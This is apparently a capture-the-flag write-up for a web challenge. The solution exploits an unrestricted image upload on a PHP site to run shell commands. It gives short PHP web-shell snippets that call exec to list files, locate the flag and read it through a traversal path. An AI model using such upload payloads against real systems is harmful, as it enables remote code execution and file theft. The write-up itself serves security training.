# Superior File Manager
## Web

> My friend insists his file manager is the best in the market.
> Can you prove him wrong?
>
> http://128.199.77.173:13001

### Files
- N/A

### Analysis
The website has an image upload and runs on PHP as inferred from the HTTP response

### Solution
1. Upload a PHP script
   ```php
   <?php echo exec("ls -la"); ?>
   ```
2. View the file after uploading
   The PHP file will be executed.
3. Accessing the flag
   ```php
   <?php echo exec("locate flag.txt"); ?>
   ```
4. Getting the flag
   ```php
   <?php echo exec("cat ../../../../../flag.txt"); ?>
   ```
